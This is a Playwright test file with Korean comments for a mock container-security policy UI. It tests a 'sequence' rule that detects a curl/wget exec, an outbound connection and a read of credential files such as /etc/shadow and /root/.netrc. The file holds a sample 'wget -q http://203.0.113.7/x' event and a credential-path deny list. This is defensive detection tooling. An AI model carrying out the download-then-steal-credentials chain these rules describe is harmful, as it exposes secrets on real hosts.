/* 2026-11-04 연쇄 규칙(kind: sequence) — 정책 화면 표시 · 편집 최소안(설계 2-4)
   ① 기본 규칙 chain-download-secrets(kill · dryRun · 10초 · exec → connect → open 3단계) · 목업 엔진(evaluate)은 연쇄 규칙을 건너뜀 · 새 기본 규칙 모의 값(missing · differs) 그대로
   ② 정책 목록: 배지 「연쇄」(badge-kind-sequence) · 대응 「시험」
   ③ 편집: 연쇄 규칙은 「고급 · YAML」만(쉬운 설정 · 폼 탭 없음), 처음 YAML 에 windowSeconds · steps 그대로
   ④ 저장 전 확인: 「연쇄 3단계 · 10초 안 · 시험(격리 대상)」 + 미리보기 불가 안내(감사 로그 재평가 없음) · dryRun 없이 kill 이면 경고 한 줄 · 저장 뒤 단계 그대로
   ⑤ 검증: 단계 1개 · windowSeconds 0 · 단계에 action · 최상위 조건 · 단계 kind sequence 는 저장 전 확인에서 거절 / 단일 규칙 YAML 에 kind: sequence 를 쓰고 다른 탭으로 가면 거절
   ⑥ 전체 YAML 왕복: steps 가 들여쓰기 그대로 나오고 「전체 교체」 뒤에도 3단계
   ⑦ 새 기본 규칙: 연쇄 규칙이 없으면 「새 기본 규칙」에 보이고 「미리보기 후 추가」 → YAML 편집 + 연쇄 저장 전 확인
   ⑧ 바뀐 기본 규칙: 단계 값이 빠졌으면 그 단계에만 더하고(steps 중복 없음), 안내 문구에 [object Object] 없음
   ⑨ 감사 상세: 시드 1행(sequence) — 「연쇄」 행 「규칙 X — exec wget(0.0초) → connect …(+2.1초) → open …(+2.4초)」 · 「이 행동 허용」 없음
   ⑩ 이벤트 상세: sequence 가 붙은 판정이면 같은 「연쇄」 행 / 없는 판정에는 없음
   ⑪ 모의 서버: 연쇄 건 「오탐」 → 자동 예외 없이 안내(백엔드 C6 와 같은 문구) · 다른 정책의 저장 전 미리보기가 연쇄 행을 「통과로 바뀜」으로 세지 않음
   ⑫ 조회자: 연쇄 규칙 읽기 전용 보기(요약 · YAML)
   ⑬ 다크 · 375px: 목록 배지 · 저장 전 확인이 깨지지 않음(가로 스크롤 없음)
   실행: (mock/ 에서) python3 -m http.server 8769 --bind 127.0.0.1 → BASE=http://127.0.0.1:8769/index.html PLAYWRIGHT=<playwright 경로> node tests/sequence-1104.cjs  (VERBOSE=1 · ONLY=정규식 · SHOTS=1 → screenshots/1104-seq-*.png) */
const fs = require('fs');
const path = require('path');
const { chromium } = require(process.env.PLAYWRIGHT || 'playwright');
const BASE = (process.env.BASE || 'http://127.0.0.1:8769').replace(/\/index\.html$/, '').replace(/\/$/, '') + '/index.html';
const SHOT_DIR = path.join(__dirname, '..', 'screenshots');
const results = []; const consoleErrors = [];
const T = async (name, fn) => {
  if (process.env.ONLY && !new RegExp(process.env.ONLY).test(name)) return;
  try { await fn(); results.push([true, name]); } catch (e) { results.push([false, name, e.message.split('\n')[0]]); }
  if (process.env.VERBOSE) { const r = results[results.length - 1]; console.log(`${r[0] ? 'PASS' : 'FAIL'}  ${r[1]}${r[2] ? '  — ' + r[2] : ''}`); }
};
const ok = (c, m) => { if (!c) throw new Error(m); };
const W = { timeout: 5000 };
const ED = '[data-view="rule-editor"]';
const SEQ = 'chain-download-secrets';
const YAML_TA = `${ED} textarea[aria-label="정책 YAML"]`;
const NO_PREVIEW = '연쇄 규칙은 미리보기를 할 수 없습니다 — 감사 로그에는 위반만 저장돼 연쇄의 앞 단계(정상 실행 · 연결)가 남아 있지 않습니다. 시험 운영(dryRun)으로 저장해 실제 판정을 지켜본 뒤 격리로 바꾸세요';
const SEQ_LINE = `규칙 ${SEQ} — exec wget(0.0초) → connect 203.0.113.7:80(+2.1초) → open /root/.netrc(+2.4초)`;

(async () => {
  const br = await chromium.launch();
  const newPage = async (vp) => {
    const pg = await br.newPage({ viewport: vp || { width: 1440, height: 900 } });
    await pg.route('https://api.osv.dev/**', (r) => r.fulfill({ status: 200, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' }, body: '{}' }));
    pg.on('console', (m) => { if (m.type() === 'error') consoleErrors.push(`${pg.url()} ${m.text()}`); });
    pg.on('pageerror', (e) => consoleErrors.push(`${pg.url()} PAGEERROR ${e.message}`));
    return pg;
  };
  const go = async (pg, hash, extra, as) => { await pg.goto(`${BASE}?source=sim&as=${as || 'admin'}${extra || ''}#${hash}`); await pg.waitForSelector('.page-title', W); await pg.waitForTimeout(450); };
  // 같은 페이지 안에서 화면만 다시 연다(UI.state 를 고친 뒤)
  const hop = async (pg, hash) => { await pg.evaluate(() => { location.hash = '#/audit'; }); await pg.waitForTimeout(250); await pg.evaluate((h) => { location.hash = '#' + h; }, hash); await pg.waitForTimeout(450); };
  const shot = async (pg, name) => { if (!process.env.SHOTS) return; fs.mkdirSync(SHOT_DIR, { recursive: true }); await pg.waitForTimeout(250); await pg.screenshot({ path: path.join(SHOT_DIR, `1104-seq-${name}.png`) }); };
  const openSeq = async (pg) => { await go(pg, `/policies?id=${SEQ}`); await pg.waitForSelector(ED, W); };
  const errText = (pg) => pg.$eval(`${ED} .foot`, (e) => (e.querySelector('.tone-danger') || {}).textContent || '');
  const setYaml = async (pg, fn) => { const cur = await pg.inputValue(YAML_TA); await pg.fill(YAML_TA, fn(cur)); };
  const checkNow = async (pg) => { await pg.click(`${ED} [aria-label="저장 전 확인"]`); await pg.waitForTimeout(250); };

  // ① 기본 규칙 · 엔진 · 새 기본 규칙 모의 값
  await T('① 기본 규칙 chain-download-secrets(kill · dryRun · 10초 · exec curl·wget → connect 내부망 밖 → open 자격 증명 10곳) · 시스템 규칙 앞 · evaluate 는 연쇄를 건너뜀 · defaults missing/differs 그대로', async () => {
    const pg = await newPage();
    await go(pg, '/policies');
    const r = await pg.evaluate(async () => {
      const R = UI.state.rules, s = R.find((x) => x.id === 'chain-download-secrets');
      const d = await UI.api.policyDefaults();
      const M = window.MOCK, E = (o) => Object.assign({ containerName: 'web-api', imageName: 'node:22-alpine', comm: 'wget', timestamp: new Date().toISOString() }, o);
      const only = (e) => { const v = M.evaluate(M.rules, e); return v.matched ? v.ruleId : 'pass'; };
      return { s, ids: R.map((x) => x.id), missing: d.missing.map((x) => x.id), differs: d.differs.map((x) => x.id), def: M.defaultRules.find((x) => x.id === 'chain-download-secrets'),
        exec: only(E({ kind: 'exec', args: 'wget -q http://203.0.113.7/x' })), netrc: only(E({ kind: 'open', path: '/root/.netrc' })), conn: only(E({ kind: 'connect', dstIp: '203.0.113.7', dstPort: 80 })) };
    });
    const s = r.s;
    ok(s && s.kind === 'sequence' && s.action === 'kill' && s.dryRun === true && s.windowSeconds === 10 && Array.isArray(s.steps) && s.steps.length === 3, `규칙 ${JSON.stringify(s)}`);
    ok(JSON.stringify(s.steps.map((x) => x.kind)) === '["exec","connect","open"]', `단계 ${JSON.stringify(s.steps.map((x) => x.kind))}`);
    ok(JSON.stringify(s.steps[0].denyComms) === '["curl","wget"]', `exec ${JSON.stringify(s.steps[0])}`);
    ok(JSON.stringify(s.steps[1].allowCidrs) === '["10.0.0.0/8","172.16.0.0/12","192.168.0.0/16","127.0.0.0/8","::1"]' && !s.steps[1].allowHosts && !s.steps[1].allowPorts, `connect ${JSON.stringify(s.steps[1])}`);
    ok(s.steps[2].denyPaths.length === 10 && ['/etc/shadow', '/root/.netrc', '/root/.git-credentials', '/root/.docker/config.json', '/root/.kube/config'].every((p) => s.steps[2].denyPaths.includes(p)), `open ${JSON.stringify(s.steps[2])}`);
    ok(s.steps.every((x) => !x.id && !x.action && !x.containers), '단계에 kind · 조건 말고 다른 필드');
    ok(r.ids.indexOf('chain-download-secrets') === r.ids.indexOf('sandbox-dns') + 1 && r.ids[r.ids.length - 1] === 'blocklist-hosts', `순서 ${JSON.stringify(r.ids)}`);
    ok(r.def && JSON.stringify(r.def) === JSON.stringify(s), '기본 정책 파일(defaultRules)에도 같은 값');
    ok(JSON.stringify(r.missing) === '["runtime-direct-ip"]' && JSON.stringify(r.differs) === '["sandbox-egress"]', `defaults ${JSON.stringify([r.missing, r.differs])}`);
    ok(r.exec === 'no-shell-download' && r.netrc === 'pass' && r.conn === 'pass', `상태 없는 평가 ${JSON.stringify([r.exec, r.netrc, r.conn])}`);
    await pg.close();
  });

  // ② 정책 목록 배지
  await T('② 정책 목록: 연쇄 규칙 배지 「연쇄」(badge-kind-sequence · indigo 계열) · 대응 「시험」 · 다른 배지 그대로', async () => {
    const pg = await newPage();
    await go(pg, '/policies');
    const rows = await pg.$$eval('[data-section="rules"] .rule-row', (els) => els.map((e) => { const k = e.querySelector('.badge-kind'); return [e.querySelector('.rule-name small').textContent, k.textContent, k.className, e.querySelector('.badge-kill, .badge-alert').textContent]; }));
    const s = rows.find((x) => x[0] === 'chain-download-secrets');
    ok(s && s[1] === '연쇄' && /badge-kind-sequence/.test(s[2]) && s[3] === '시험', `연쇄 행 ${JSON.stringify(s)}`);
    ok(rows.some(([id, k]) => id === 'sandbox-dns' && k === '조회') && rows.some(([id, k]) => id === 'sensitive-files' && k === '파일'), '기존 배지');
    const color = await pg.$eval('[data-section="rules"] .badge-kind-sequence', (e) => [getComputedStyle(e).backgroundColor, getComputedStyle(e).color]);
    const tok = await pg.evaluate(() => [UI.cssVar('--accent-soft'), UI.cssVar('--accent-text')]);
    ok(color[0] !== 'rgba(0, 0, 0, 0)' && color[0] !== color[1], `배지 색 ${JSON.stringify(color)} 토큰 ${JSON.stringify(tok)}`);
    await shot(pg, 'list');
    await pg.close();
  });

  // ③ 편집 = YAML 만
  await T('③ 연쇄 규칙 편집: 탭은 「고급 · YAML」 하나(쉬운 설정 · 폼 없음) · 처음 YAML 에 kind: sequence · windowSeconds: 10 · steps 3개(들여쓰기) · dryRun', async () => {
    const pg = await newPage();
    await openSeq(pg);
    const modes = await pg.$$eval(`${ED} [data-mode]`, (els) => els.map((e) => [e.dataset.mode, e.getAttribute('aria-pressed')]));
    ok(JSON.stringify(modes) === '[["yaml","true"]]', `탭 ${JSON.stringify(modes)}`);
    ok(await pg.locator(`${ED} [data-step]`).count() === 0, '쉬운 설정이 보임');
    const y = await pg.inputValue(YAML_TA);
    for (const want of ['id: chain-download-secrets', 'kind: sequence', 'action: kill', 'dryRun: true', 'windowSeconds: 10', 'steps:', '  - kind: exec', '    denyComms:', '      - curl', '  - kind: connect', '    allowCidrs:', '  - kind: open', '      - /root/.kube/config'])
      ok(y.split('\n').includes(want), `YAML 에 「${want}」 없음:\n${y}`);
    ok(!/^denyComms:/m.test(y) && !/^allowCidrs:/m.test(y), '조건이 최상위에 나옴');
    ok((await pg.textContent(`${ED} .editor-head`)).includes('kill → 알림만 (dry-run)'), '적용 결과 문구');
    await shot(pg, 'yaml');
    await pg.close();
  });

  // ④ 저장 전 확인
  await T('④ 저장 전 확인: 요약 「연쇄 3단계 · 10초 안 · 시험(격리 대상)」 · 미리보기 불가 안내(감사 로그 재평가 없음) · dryRun 이면 경고 없음 → dryRun 지우면 경고 한 줄 → 저장 뒤 단계 그대로', async () => {
    const pg = await newPage();
    await openSeq(pg);
    await checkNow(pg);
    await pg.waitForSelector('[data-part="save-check"]', W);
    const sum = await pg.textContent('[data-part="save-check"] [data-summary]');
    ok(sum === '연쇄 3단계 · 10초 안 · 시험(격리 대상)', `요약 「${sum}」`);
    ok((await pg.textContent('[data-part="seq-no-preview"]')).trim() === NO_PREVIEW, `안내 「${await pg.textContent('[data-part="seq-no-preview"]')}」`);
    ok(await pg.locator('[data-preview-count]').count() === 0 && !(await pg.textContent('[data-part="save-check"]')).includes('계산하는 중'), '감사 로그 재평가가 보임');
    ok(await pg.locator('[data-part="seq-kill-warn"]').count() === 0, 'dryRun 인데 경고');
    await shot(pg, 'check');
    await pg.click('[data-part="save-check"] button:has-text("← 고치기")');
    await pg.waitForSelector(YAML_TA, W);
    await setYaml(pg, (y) => y.split('\n').filter((l) => l !== 'dryRun: true').join('\n'));
    await checkNow(pg);
    await pg.waitForSelector('[data-part="save-check"]', W);
    ok((await pg.textContent('[data-part="save-check"] [data-summary]')) === '연쇄 3단계 · 10초 안 · 격리', '격리 요약');
    const warn = (await pg.textContent('[data-part="seq-kill-warn"]')).trim();
    ok(warn === '시험 운영(dryRun) 없이 격리(kill)로 저장합니다 — 오탐이면 정상 컨테이너가 바로 종료됩니다. 먼저 dryRun: true 로 지켜보기를 권합니다', `경고 「${warn}」`);
    await shot(pg, 'check-kill');
    await pg.click('[aria-label="저장 후 적용"]');
    await pg.waitForTimeout(400);
    const s = await pg.evaluate(() => UI.state.rules.find((x) => x.id === 'chain-download-secrets'));
    ok(s && !s.dryRun && s.windowSeconds === 10 && s.steps.length === 3 && s.steps[2].denyPaths.length === 10 && s.steps[1].allowCidrs.includes('::1'), `저장 결과 ${JSON.stringify(s)}`);
    ok(await pg.locator(`${ED} [data-mode]`).count() === 1, '저장 뒤에도 YAML 하나');
    const ch = await pg.evaluate(() => UI.state.changes[0]);
    ok(ch && ch.kind === 'policy_edit' && ch.summary.includes('chain-download-secrets'), `변경 이력 ${JSON.stringify(ch)}`);
    await pg.close();
  });

  // ⑤ 검증
  await T('⑤ 검증: 단계 1개 · windowSeconds 0 · 단계에 action · 최상위 조건 · 단계 kind sequence 거절 / 단일 규칙 YAML 에 kind: sequence → 다른 탭 전환 거절', async () => {
    const pg = await newPage();
    await openSeq(pg);
    const orig = await pg.inputValue(YAML_TA);
    const cases = [
      ['단계 1개', (y) => y.split('  - kind: connect')[0].trimEnd(), /steps: 단계 2~5개 \(지금 1개\)/],
      ['창 0', (y) => y.replace('windowSeconds: 10', 'windowSeconds: 0'), /windowSeconds 0: 1~60/],
      ['창 없음', (y) => y.replace('windowSeconds: 10\n', ''), /windowSeconds/],
      ['단계에 action', (y) => y.replace('  - kind: exec', '  - kind: exec\n    action: kill'), /steps\[0\]: 단계에는 kind 와 조건만/],
      ['최상위 조건', (y) => y.replace('windowSeconds: 10', 'windowSeconds: 10\ndenyComms:\n  - nc'), /sequence 규칙 최상위에는 조건을 쓸 수 없음/],
      ['중첩 sequence', (y) => y.replace('  - kind: open', '  - kind: sequence'), /steps\[2\]: kind "sequence": exec \| open \| connect \| dns/],
      ['빈 단계', (y) => y.replace(/  - kind: connect\n    allowCidrs:\n(      - .*\n)+/, '  - kind: connect\n'), /steps\[1\]: connect 규칙에 조건이 없음/],
    ];
    for (const [name, fn, re] of cases) {
      await pg.fill(YAML_TA, fn(orig));
      await checkNow(pg);
      ok(await pg.locator('[data-part="save-check"]').count() === 0, `${name}: 저장 전 확인이 열림`);
      const e = await errText(pg);
      ok(re.test(e), `${name}: 오류 「${e}」`);
    }
    // 단일 규칙: YAML 에서 kind: sequence 로 바꾸고 쉬운 설정으로 가면 거절(단계를 잃지 않게)
    await go(pg, '/policies?id=sensitive-files');
    await pg.waitForSelector(ED, W);
    await pg.click(`${ED} [data-mode="yaml"]`);
    await pg.waitForSelector(YAML_TA, W);
    await pg.fill(YAML_TA, orig.replace('id: chain-download-secrets', 'id: sensitive-files'));
    await pg.click(`${ED} [data-mode="easy"]`);
    await pg.waitForTimeout(200);
    ok(await pg.$eval(`${ED} [data-mode="yaml"]`, (e) => e.getAttribute('aria-pressed')) === 'true', 'YAML 탭에 남아야 함');
    ok((await errText(pg)).includes('연쇄 규칙(sequence)은 「고급 · YAML」로만 편집합니다'), `오류 「${await errText(pg)}」`);
    await pg.close();
  });

  // ⑥ 전체 YAML 왕복
  await T('⑥ 전체 정책 YAML: 연쇄 규칙의 steps 가 규칙 안 들여쓰기로 나오고 「전체 교체」 뒤에도 3단계 · 10초', async () => {
    const pg = await newPage();
    await go(pg, '/policies?id=__yaml__');
    await pg.waitForFunction(() => { const t = document.querySelector('textarea[aria-label="전체 정책 YAML"]'); return t && !t.disabled; }, null, W);
    const y = await pg.inputValue('textarea[aria-label="전체 정책 YAML"]');
    const lines = y.split('\n');
    ok(lines.includes('  - id: chain-download-secrets') && lines.includes('    windowSeconds: 10') && lines.includes('    steps:') && lines.includes('      - kind: exec') && lines.includes('        denyComms:') && lines.includes('          - curl'), `전체 YAML:\n${lines.slice(lines.indexOf('  - id: chain-download-secrets'), lines.indexOf('  - id: chain-download-secrets') + 12).join('\n')}`);
    await pg.click('button:has-text("전체 교체 후 적용")');
    await pg.waitForSelector('dialog[data-part="confirm"][open]', W);
    await pg.click('dialog[data-part="confirm"] [data-confirm="ok"]');
    await pg.waitForTimeout(400);
    const s = await pg.evaluate(() => UI.state.rules.find((x) => x.id === 'chain-download-secrets'));
    ok(s && s.kind === 'sequence' && s.windowSeconds === 10 && s.steps.length === 3 && JSON.stringify(s.steps[0]) === '{"kind":"exec","denyComms":["curl","wget"]}', `교체 뒤 ${JSON.stringify(s)}`);
    await pg.close();
  });

  // ⑦ 새 기본 규칙(빠진 연쇄 규칙)
  await T('⑦ 새 기본 규칙: 연쇄 규칙이 없으면 안내 띠에 보이고 「미리보기 후 추가」 → YAML 편집(탭 하나) + 연쇄 저장 전 확인 → 저장하면 안내에서 빠짐', async () => {
    const pg = await newPage();
    await go(pg, '/policies');
    await pg.evaluate(() => { UI.state.rules = UI.state.rules.filter((x) => x.id !== 'chain-download-secrets'); });
    await hop(pg, '/policies');
    await pg.waitForSelector('[data-part="defaults-banner"]', W);
    await pg.click('[data-action="defaults-toggle"]');
    await pg.waitForSelector('[data-default="chain-download-secrets"]', W);
    await pg.click('[data-default="chain-download-secrets"] [data-action="default-preview"]');
    await pg.waitForSelector('[data-part="save-check"]', W);
    ok((await pg.textContent('.pol-right .panel-head h2')).includes('새 기본 규칙 · chain-download-secrets'), '편집 제목');
    ok((await pg.textContent('[data-part="save-check"] [data-summary]')) === '연쇄 3단계 · 10초 안 · 시험(격리 대상)', '요약');
    ok(await pg.locator('[data-part="seq-no-preview"]').count() === 1, '안내 없음');
    await pg.click('[aria-label="저장 후 적용"]');
    await pg.waitForTimeout(500);
    const r = await pg.evaluate(async () => { const s = UI.state.rules.find((x) => x.id === 'chain-download-secrets'); const d = await UI.api.policyDefaults(); return { steps: s && s.steps.length, missing: d.missing.map((x) => x.id) }; });
    ok(r.steps === 3 && !r.missing.includes('chain-download-secrets'), `저장 뒤 ${JSON.stringify(r)}`);
    await pg.close();
  });

  // ⑧ 바뀐 기본 규칙(단계 값이 빠짐)
  await T('⑧ 바뀐 기본 규칙: 지금 규칙의 3단계에서 경로 하나 · 창 20초 → 안내 「steps[2].denyPaths +/root/.kube/config」 · 병합은 그 단계에만 더하고 steps 3개 그대로 · 창 20 유지', async () => {
    const pg = await newPage();
    await go(pg, '/policies');
    await pg.evaluate(() => { const s = UI.state.rules.find((x) => x.id === 'chain-download-secrets'); s.windowSeconds = 20; s.steps[2].denyPaths = s.steps[2].denyPaths.filter((p) => p !== '/root/.kube/config'); });
    await hop(pg, '/policies');
    await pg.waitForSelector('[data-part="defaults-banner"]', W);
    await pg.click('[data-action="defaults-toggle"]');
    await pg.waitForSelector('[data-default="chain-download-secrets"]', W);
    const txt = await pg.textContent('[data-default="chain-download-secrets"]');
    ok(!txt.includes('[object Object]') && txt.includes('steps[2].denyPaths +/root/.kube/config') && txt.includes('windowSeconds: 20 (지금 값 유지, 기본은 10)'), `안내 「${txt}」`);
    await pg.click('[data-default="chain-download-secrets"] [data-action="default-preview"]');
    await pg.waitForSelector('[data-part="save-check"]', W);
    ok((await pg.textContent('[data-part="save-check"] [data-summary]')) === '연쇄 3단계 · 20초 안 · 시험(격리 대상)', `요약 ${await pg.textContent('[data-part="save-check"] [data-summary]')}`);
    await pg.click('[aria-label="저장 후 적용"]');
    await pg.waitForTimeout(500);
    const s = await pg.evaluate(() => UI.state.rules.find((x) => x.id === 'chain-download-secrets'));
    ok(s.steps.length === 3 && s.windowSeconds === 20 && s.steps[2].denyPaths.length === 10 && s.steps[2].denyPaths.filter((p) => p === '/etc/shadow').length === 1 && s.steps[0].denyComms.length === 2, `병합 ${JSON.stringify(s)}`);
    await pg.close();
  });

  // ⑨ 감사 상세
  await T('⑨ 감사 시드 1행(sequence · 격리 대상): 상세에 「연쇄」 행 한 줄 · 사유는 백엔드 문구 · 「이 행동 허용」 없음 · 정책 보기 링크', async () => {
    const pg = await newPage();
    await go(pg, '/audit');
    const a = await pg.evaluate(() => { const rows = UI.state.audit.filter((x) => x.sequence); return { n: rows.length, a: rows[0], lvl: rows[0] && UI.levelOf(rows[0]) }; });
    ok(a.n === 1 && a.a.ruleId === 'chain-download-secrets' && a.a.sequence.ruleId === 'chain-download-secrets' && a.a.sequence.dryRun === true && a.a.sequence.steps.length === 3 && a.lvl === 'held', `시드 ${JSON.stringify(a)}`);
    ok(a.a.reason === '연쇄 3단계(10초 안): exec wget → connect 203.0.113.7:80 → open /root/.netrc · 2.4초', `사유 ${a.a.reason}`);
    ok(a.a.sequence.steps.every((s) => s.kind && s.timestamp && 'comm' in s && 'pid' in s && 'detail' in s), `단계 모양 ${JSON.stringify(a.a.sequence.steps[0])}`);
    // 11/04 결정: 시드 행은 실제 백엔드처럼 런타임 건에 묶이고, 그 건은 「악성」 판정 · 종결된 과거 건(제안 · 차단 목록은 만들지 않음)
    const cs = await pg.evaluate((id) => { const c = UI.srv.caseById(id); return c && { source: c.source, state: c.state, decision: c.decision, proposalId: c.proposalId }; }, a.a.caseId);
    ok(cs && cs.source === 'runtime' && cs.state === 'closed' && cs.decision === 'malicious' && !cs.proposalId, `시드 건 ${a.a.caseId} ${JSON.stringify(cs)}`);
    await go(pg, `/audit?id=${a.a.id}`);
    await pg.waitForSelector('.sheet[data-sheet="audit"]', W);
    const row = await pg.$$eval('.sheet[data-sheet="audit"] dl dt', (els) => els.map((e) => [e.textContent, e.nextElementSibling.textContent]).filter(([k]) => k === '연쇄'));
    ok(row.length === 1 && row[0][1] === SEQ_LINE, `연쇄 행 ${JSON.stringify(row)}`);
    ok(await pg.locator('.sheet[data-sheet="audit"] [data-action="allow-this"]').count() === 0, '연쇄 규칙에 「이 행동 허용」');
    ok(await pg.locator('.sheet[data-sheet="audit"] a[href="#/policies?id=chain-download-secrets"]').count() === 1, '정책 보기 링크');
    await shot(pg, 'audit');
    // 다른 행에는 연쇄 행이 없다
    const other = await pg.evaluate(() => UI.state.audit.find((x) => !x.sequence).id);
    await go(pg, `/audit?id=${other}`);
    await pg.waitForSelector('.sheet[data-sheet="audit"]', W);
    ok(!(await pg.$$eval('.sheet[data-sheet="audit"] dl dt', (els) => els.map((e) => e.textContent))).includes('연쇄'), '일반 행에 연쇄');
    await pg.close();
  });

  // ⑩ 이벤트 상세
  await T('⑩ 이벤트 상세: sequence 가 붙은 판정(단일 규칙이 이긴 주석 포함)이면 「연쇄」 행 · 없으면 없음', async () => {
    const pg = await newPage();
    await go(pg, '/events');
    await pg.evaluate(() => {
      const a = UI.state.audit.find((x) => x.sequence);
      // 단일 규칙이 이긴 경우: 판정은 sensitive-files, 연쇄는 주석(Verdict.Sequence)
      const v = Object.assign(JSON.parse(JSON.stringify(a)), { key: 990001, ruleId: 'sensitive-files', action: 'kill', reason: '금지 경로 /root/.ssh/ 접근', enforced: true });
      delete v.dryRun; delete v.id; delete v.caseId; delete v.install;
      v.event.path = '/root/.ssh/id_rsa'; v.event.timestamp = new Date().toISOString();
      UI.state.verdicts.unshift(v);
    });
    await pg.evaluate(() => { location.hash = '#/events?id=990001'; }); await pg.waitForTimeout(450);
    await pg.waitForSelector('.sheet[data-sheet="event"]', W);
    const row = await pg.$$eval('.sheet[data-sheet="event"] dl dt', (els) => els.map((e) => [e.textContent, e.nextElementSibling.textContent]).filter(([k]) => k === '연쇄'));
    ok(row.length === 1 && row[0][1] === `${SEQ_LINE} · 판정은 sensitive-files`, `연쇄 행 ${JSON.stringify(row)}`);
    const plain = await pg.evaluate(() => (UI.state.verdicts.find((x) => !x.sequence && x.matched) || {}).key);
    if (plain) {
      await pg.evaluate((k) => { location.hash = `#/events?id=${k}`; }, plain); await pg.waitForTimeout(450);
      if (await pg.locator('.sheet[data-sheet="event"]').count()) ok(!(await pg.$$eval('.sheet[data-sheet="event"] dl dt', (els) => els.map((e) => e.textContent))).includes('연쇄'), '일반 판정에 연쇄');
    }
    await pg.close();
  });

  // ⑪ 모의 서버 — 오탐 안내 · 미리보기
  await T('⑪ 모의 서버: 연쇄 건 「오탐」 → 변경 없이 「연쇄 규칙 chain-download-secrets 은 자동 예외를 만들지 않습니다 — 정책 탭에서 직접 수정하세요」 · 다른 정책 저장 전 미리보기가 연쇄 행을 바뀜으로 세지 않음', async () => {
    const pg = await newPage();
    await go(pg, '/');
    const r = await pg.evaluate(() => {
      const a = UI.state.audit.find((x) => x.sequence), prevCase = a.caseId; a.caseId = 'case-seq-test'; // 11/04: 시드 건 번호를 잠시 바꿨다가 되돌린다
      const fp = UI.srv.proposalChanges({ id: 'case-seq-test', source: 'runtime', image: a.event.imageName }, 'false_positive');
      a.caseId = prevCase;
      const sf = JSON.parse(JSON.stringify(UI.state.rules.find((x) => x.id === 'sensitive-files'))); sf.description = '설명만 바꿈';
      const pv = UI.srv.previewRule(sf);
      return { fp, changed: pv.changed.filter((x) => x.auditId === a.id).length, total: pv.changed.length };
    });
    ok(r.fp.changes.length === 0 && JSON.stringify(r.fp.notes) === JSON.stringify(['연쇄 규칙 chain-download-secrets 은 자동 예외를 만들지 않습니다 — 정책 탭에서 직접 수정하세요']), `오탐 ${JSON.stringify(r.fp)}`);
    ok(r.changed === 0 && r.total === 0, `미리보기 바뀜 ${JSON.stringify(r)}`);
    await pg.close();
  });

  // ⑫ 조회자
  await T('⑫ 조회자: 연쇄 규칙 읽기 전용 — 요약 「연쇄 3단계 · 10초 안 · 시험(격리 대상)」 · YAML 에 steps', async () => {
    const pg = await newPage();
    await go(pg, `/policies?id=${SEQ}`, '', 'viewer');
    await pg.waitForSelector(`[data-readonly-rule="${SEQ}"]`, W);
    ok((await pg.textContent(`[data-readonly-rule="${SEQ}"] .summary-bar`)) === '연쇄 3단계 · 10초 안 · 시험(격리 대상)', '요약');
    const y = await pg.textContent(`[data-readonly-rule="${SEQ}"] pre`);
    ok(y.includes('steps:') && y.includes('  - kind: open') && y.includes('windowSeconds: 10'), `YAML ${y}`);
    await pg.close();
  });

  // ⑬ 다크 · 375px
  await T('⑬ 다크 · 375px: 목록 배지 「연쇄」 · YAML 편집 · 저장 전 확인 안내가 화면 폭 안(가로 스크롤 없음)', async () => {
    const pg = await newPage();
    await go(pg, `/policies?id=${SEQ}`, '&theme=dark');
    ok(await pg.$eval('html', (e) => e.dataset.theme) === 'dark', '다크 아님');
    const c = await pg.$eval('[data-section="rules"] .badge-kind-sequence', (e) => [getComputedStyle(e).backgroundColor, getComputedStyle(e).color]);
    ok(c[0] !== 'rgba(0, 0, 0, 0)' && c[0] !== c[1], `다크 배지 ${JSON.stringify(c)}`);
    await shot(pg, 'dark-list');
    await checkNow(pg);
    await pg.waitForSelector('[data-part="seq-no-preview"]', W);
    await shot(pg, 'dark-check');
    await pg.close();
    const m = await newPage({ width: 375, height: 812 });
    await go(m, `/policies?id=${SEQ}`);
    await m.waitForSelector(ED, W);
    ok(await m.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), `가로 스크롤 ${await m.evaluate(() => [document.documentElement.scrollWidth, window.innerWidth])}`);
    await m.click(`${ED} [aria-label="저장 전 확인"]`); await m.waitForTimeout(250);
    await m.waitForSelector('[data-part="seq-no-preview"]', W);
    await m.$eval('[data-part="save-check"]', (e) => e.scrollIntoView());
    ok(await m.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), '저장 전 확인 가로 스크롤');
    const box = await m.$eval('[data-part="seq-no-preview"]', (e) => { const r = e.getBoundingClientRect(); return [r.left, r.right]; });
    ok(box[0] >= 0 && box[1] <= 375, `안내 상자 ${JSON.stringify(box)}`);
    await shot(m, '375');
    await m.close();
  });

  await br.close();
  const failed = results.filter((r) => !r[0]);
  if (!process.env.VERBOSE) results.forEach((r) => console.log(`${r[0] ? 'PASS' : 'FAIL'}  ${r[1]}${r[2] ? '  — ' + r[2] : ''}`));
  console.log(`\n${results.length - failed.length}/${results.length} 통과 · 콘솔 오류 ${consoleErrors.length}건`);
  consoleErrors.slice(0, 5).forEach((e) => console.log('  ', e));
  process.exit(failed.length || consoleErrors.length ? 1 : 0);
})();
